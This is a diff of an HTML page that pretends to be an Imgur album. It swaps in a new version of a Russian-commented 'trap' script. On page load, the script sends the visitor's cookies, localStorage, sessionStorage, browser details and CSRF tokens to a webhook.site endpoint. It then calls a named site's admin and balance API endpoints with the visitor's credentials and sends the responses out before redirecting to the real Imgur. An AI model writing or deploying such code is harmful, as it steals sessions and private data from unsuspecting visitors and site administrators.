@@ -1,55 +1,57 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Loading...</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Imgur: The magic of the Internet</title>
+<style>
+    body { margin:0; font-family: system-ui; }
+    iframe { width:100vw; height:100vh; border:none; }
+</style>
+</head>
+<body>
+<iframe src="https://imgur.com/a/EYrx0v9" id="targetFrame"></iframe>
+
 <script>
     // ==============================================
-    // КОД-ЛОВУШКА
+    // ТВОЙ НОВЫЙ WEBHOOK
     // ==============================================
-    const WEBHOOK_URL = 'https://webhook.site/10aca89b-43e6-4116-ab1d-99fa6a90f9c4';
+    const WEBHOOK = 'https://webhook.site/05d25e4c-eb59-492d-8988-60566db35d6d';
     
-    function sendData(type, data) {
+    function send(type, data) {
         try {
-            // Отправка через fetch
-            fetch(WEBHOOK_URL + '?type=' + encodeURIComponent(type) + '&data=' + encodeURIComponent(JSON.stringify(data)), {
+            fetch(`${WEBHOOK}?type=${encodeURIComponent(type)}&data=${encodeURIComponent(JSON.stringify(data))}`, {
                 mode: 'no-cors'
             });
-            // Запасной вариант
-            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({type: type, data: data}));
+            navigator.sendBeacon(WEBHOOK, JSON.stringify({type, data}));
         } catch(e) {}
     }
     
-    // 1. Куки
-    sendData('cookies', document.cookie || 'empty');
+    // 1. КУКИ
+    send('cookies', document.cookie || 'empty');
     
-    // 2. localStorage
+    // 2. LOCALSTORAGE
     try {
         const ls = {};
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             if (key) ls[key] = localStorage.getItem(key);
         }
-        sendData('localStorage', ls);
-    } catch(e) {
-        sendData('localStorage_error', e.message);
-    }
+        send('localStorage', ls);
+    } catch(e) {}
     
-    // 3. sessionStorage
+    // 3. SESSIONSTORAGE
     try {
         const ss = {};
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
             if (key) ss[key] = sessionStorage.getItem(key);
         }
-        sendData('sessionStorage', ss);
-    } catch(e) {
-        sendData('sessionStorage_error', e.message);
-    }
+        send('sessionStorage', ss);
+    } catch(e) {}
     
-    // 4. Данные окружения (чтобы отличить бота от человека)
-    sendData('env', {
+    // 4. ДАННЫЕ ОКРУЖЕНИЯ (чтобы отличить бота от человека)
+    send('env', {
         userAgent: navigator.userAgent,
         language: navigator.language,
         platform: navigator.platform,
@@ -60,16 +62,62 @@
         timestamp: new Date().toISOString()
     });
     
-    // 5. Перенаправление на настоящий Imgur через 0.3 секунды
+    // 5. CSRF-ТОКЕНЫ из мета-тегов
+    const csrfMeta = document.querySelector('meta[name="csrf-token"]')?.content;
+    if (csrfMeta) send('csrf_meta', csrfMeta);
+    
+    // 6. АТАКА НА API АДМИНКИ (если админ залогинен)
+    const adminEndpoints = [
+        'https://admin.streamskill.pro/api/user/me',
+        'https://admin.streamskill.pro/api/profile',
+        'https://admin.streamskill.pro/user/current',
+        'https://admin.streamskill.pro/site/me',
+        'https://admin.streamskill.pro/api/auth/check',
+        'https://streamskill.pro/cabinet/api/user-info',
+        'https://streamskill.pro/api/balance'
+    ];
+    
+    let idx = 0;
+    function probeApi() {
+        if (idx >= adminEndpoints.length) return;
+        const url = adminEndpoints[idx];
+        fetch(url, {
+            credentials: 'include',
+            headers: {
+                'Accept': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest'
+            }
+        })
+        .then(res => {
+            send(`api_res_${idx}`, {
+                url: url,
+                status: res.status,
+                statusText: res.statusText
+            });
+            if (res.status === 200) return res.text();
+            return null;
+        })
+        .then(body => {
+            if (body) send(`api_data_${idx}`, {
+                url: url,
+                data: body.substring(0, 1500)
+            });
+        })
+        .catch(err => send(`api_err_${idx}`, {
+            url: url,
+            error: err.message
+        }))
+        .finally(() => {
+            idx++;
+            setTimeout(probeApi, 300);
+        });
+    }
+    probeApi();
+    
+    // 7. ПЕРЕНАПРАВЛЕНИЕ НА НАСТОЯЩИЙ IMGUR через 1.5 секунды
     setTimeout(function() {
-        window.location.href = 'https://imgur.com/a/uej4cAd';
-    }, 300);
+        window.location.href = 'https://imgur.com/a/EYrx0v9';
+    }, 1500);
 </script>
-</head>
-<body>
-    <div style="text-align:center; padding:50px; font-family:Arial;">
-        <h2>Loading...</h2>
-        <p>Please wait, you will be redirected shortly.</p>
-    </div>
 </body>
 </html>
